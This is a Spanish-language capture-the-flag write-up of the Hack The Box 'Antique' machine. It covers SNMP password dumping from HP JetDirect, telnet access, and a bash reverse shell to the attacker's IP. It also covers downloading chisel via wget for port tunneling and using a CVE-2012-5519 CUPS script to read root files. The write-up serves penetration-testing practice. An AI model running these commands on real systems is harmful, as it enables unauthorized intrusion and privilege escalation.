---
title: Writeup antique - Hack The Box - Resolución y Análisis
published: true
tags:
  - hackthebox
  - writeup
  - antique
  - ciberseguridad
  - pentesting
description: Writeup y resolución de la máquina antique en Hack The Box.
keywords:
  - writeup antique
  - hack the box antique
  - resolución máquina antique
  - antique hack the box
  - htb antique
---
--------------
### 🔗 Accesos rápidos

- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/Facil/Linux/Antique)
- 📺 **Resolución en vivo (completa)**: [Parte1](https://www.youtube.com/watch?v=p7PLHdKPf-g)|[Parte2](https://www.youtube.com/watch?v=KaQeiDMzlH0)|[Parte3](https://www.youtube.com/watch?v=MSbMf7XIt-Q)
- 🧠 **Explicación resumida**: 

---

#easy #linux #nmap #ping #telnet #tratamientotty #cve-2012-5519 #snmp #chisel #wget #python3 #reverseshell #python3httpserver #nc-nlvp443 

-----------------
# Guided Mode

1)Después de ejecutar un escaneo nmap en los puertos TCP, identificamos que el puerto 23 está abierto. Si ejecutamos otro escaneo en los puertos UDP, ¿qué puerto encontramos abierto?
	161

2)¿Qué servicio se está ejecutando en el puerto UDP que identificamos en la pregunta anterior?
	snmp

3)Conectémonos al puerto 23 utilizando el comando «telnet». ¿Qué nombre de producto nos proporciona Telnet que nos ayude a identificar el software que se está utilizando?
	HP Jetdirect

4)¿Cuál es la contraseña para el servicio Telnet de HJ JetDirect?
	P@ssw0rd@123!!123

5)Después de autenticarnos correctamente con el servicio Telnet, ¿qué comando podemos utilizar para ejecutar comandos del sistema?
	exec

*La pregunta anterior era la flag de user.txt*
7)La caja tiene un servicio que escucha en la interfaz 127.0.0.1. ¿Qué puerto TCP es?
	631

8)¿Qué versión de CUPS se está ejecutando en el puerto 631?
	1.6.1

9)¿Cuál es el CVE de 2012 asociado a una vulnerabilidad de lectura de archivos locales en CUPS 1.6.1?
	CVE-2012-5519

---------
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.10.11.107
nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.10.11.107 -oG allPorts
nmap -sCV -p23 10.10.11.107 -oN target
```

![[Antique1.png]]
![[Antique3.png]]
![[Antique4.png]]

*TTL:* Maquina linux
*Puertos TCP:*
	`23` [[telnet]]

### Las preguntas de HTB nos decian que hagamos un escaneo por UDP

```shell
nmap -sU -Pn -n -vvv --top-ports 200 10.10.11.107 -oN udp-scan
nmap -sU -sCV -p161 10.10.11.107 -oN udp-taget
```

![[Antique5.png]]
![[Antique6.png]]
*Puerto UDP:*
	`161` snmp

--------
# [[HP JetDirect Printer - SNMP]]

Intentamos conectarnos a [[telnet]] usando el comando `telnet 10.10.11.107 23`, nos pide una contraseña la cual no sabemos, pero nos da esto de *HP JetDirect*
![[Antique10.png]]

### Buscando vulnerabilidades con [[searchsploit]]

Usamos ``searchsploit jetdirect`` y viendo todas a nosotros nos interesa la 22319 por lo que la vamos a descargar con el comando `searchsploit -m hardware/remote/22319.txt`

![[Antique8.png]]

Vamos a ver el archivo con [[cat]] usando el comando ``cat 22319.txt`
![[Antique9.png]]


###  Dumpeamos contraseña con [[snmp]]

Modificando el payload que vimos en el exploit anterior, vamos a usar el comando `snmpget -v1 -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0` que nos va a servir para dumpear contraseñas en HEX

![[Antique7.png]]

nos da este output en hexadecimal

```
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 
```


### [[Pasar de HEX a ascii con python]]

Abri el  interprete de python con `python` despues se importa la libreria binascci con el comando `import binascii` luego vamos a poner todos los numeros en hexadecimal dandoselos a una variable poniendo

```
s='50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 11 9 122 123 126 130 131 134 135'
```

Y luego para terminar vamos a usar la libreria que importamos al principio con ``binascii.unhexlify(s.replace(' ',''))`` usando el replace para sacar los espacios

![[Antique11.png]]
![[Antique12.png]]
Y nos da la contraseña *P@ssw0rd@123!!123*


### Conexion con [[telnet]]

Vamos a usar el comando `telnet 10.10.11.107 23` Y vamos a poner la contraseña que dumpeamos previamente, y ya estamos adentro de la maquina
![[Antique15.png]]


-----
# [[Reverse shell]]

La maquina victima solamente nos va a dejar utilizar comandos si ponemos exec al principio, y para tener mayor comodidad nos vamos a mandar una [[Reverse shell]]
Vamos a ejecutar `exec bash -c 'bash -i >& /dev/tcp/10.10.16.15/443 0>&1'` mientras estamos en escucha con [[nc -nlvp 443]]

![[Antique16.png]]
Y ya ganamos acceso a la maquina

![[Antique17.png]]

-------
# [[Tratamiento de la TTY]]

No me dejaba hacer el tratamiento correctamente, de la forma que lo pude solucionar fue esta

Solamente tuve que cambiar el primer comando enves de `script /dev/null -c bash` tuve que usar `python3 -c 'import pty; pty.spawn("/bin/bash")'` pero despues es todo lo mismo

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo;fg
reset xterm
export SHELL=bash
export TERM=xterm
stty rows 40 columns 184
```
Por lo que entendi esto pasa por que no era una tty lo que estabamos recibiendo, y el `script /dev/null solamente sirve para ttys`

------
# Tunneling con [[chisel]]

Usamos [[netstat]] con el comando `netstat -nat` para ver los puertos abiertos

![[Antique20.png]]
Vemos que el puerto 631 esta abierto

### [[chisel]]
Como no tenemos [[ssh]] para hacer un tuneling vamos a usar la herramienta [[chisel]]

La vamos a descargar en nuestra maquina usando [[git clone]] con el comando `git clone https://github.com/jpillora/chisel`
Ahora vamos a entrar al repositorio con [[cd]] usando el comando `cd chisel` y vamos a compilar el binario usando `CGO_ENABLED=0 go build -ldflags "-s -w" .`

![[Antique25.png]]

Mientras levantamos un servidor de [[python3 -m http.server]] con el comando `python3 -m http.server 80` para pasarnos el binario que compilamos antes a la maquina victima

![[Antique22.png]]

Ahora en la maquina victima, vamos a descargar el binario con [[wget]] usando el comando `wget http://10.10.16.15/chisel`

![[Antique24.png]]


Una vez que ya lo tenemos. Desde nuestra maquina ATACANTE vamos a levantar un servidor de [[chisel]] por el puerto 8000 con el comando `./chisel server -p 8000 --reverse`

![[Antique21.png]]


Desde la maquina victima, vamos a ejecutar el binario que previamente descargamos con el comando `./chisel client 10.10.16.15:8000 R:5000:127.0.0.1:631`
![[Antique23.png]]

Ahora el puerto *631* de la maquina VICTIMA va a ser nuestro puerto local *5000* en la maquina ATACANTE



---------
# [[CVE-2012-5519]]

Entramos desde el navegador al puerto 5000 y vemos que es una pagina, con el servicio *CUPS 1.6.1*
![[Antique26.png]]
Buscando en internet encontramos este [[CVE-2012-5519]]
Y vamos a descargar el [repositorio](https://github.com/p1ckzi/CVE-2012-5519) con [[git clone]] usando el comando `git clone https://github.com/p1ckzi/CVE-2012-5519` luego con [[cd]] vamos a entrar a la carpeta `cd CVE-2012-5519` 
![[Antique27.png]]
Lo vamos a pasar a la maquina victima, levantando un servidor con [[python3 -m http.server]] usando el comando `python3 -m http.server 80`

### Aclaracion: 
Como estamos con las otras pestañas ejecutando el [[chisel]] vamos a tener que volver a entablar una conexion por [[telnet]] nueva y por otro puerto mandarnos otra [[Reverse shell]] para poder movernos por la maquina VICTIMA, en este caso lo voy a hacer por el puerto *4000* y luego voy a hacer un [[Tratamiento de la TTY]]

![[Antique28.png]]
![[Antique29.png]]


Ahora con [[wget]] vamos a descargar el binario a ejecutar del [[CVE-2012-5519]] con el comando `wget http://10.10.16.15/cups-root-file-read.sh`
Le damos permiso de ejecucion al archivo con [[chmod]] usando `chmod +x cups-root-file-read.sh`

![[Antique30.png]]
Ahora lo vamos a ejecutar usando `./cups-root-file-read.sh`

Y vamos a leer la flag poniendo ``/root/root.txt``


----
# Creditos

Writeup oficial HackTheBox
[Writeup de vickyaryan7](https://vickyaryan7.medium.com/hackthebox-walkthrough-antique-060561357627)

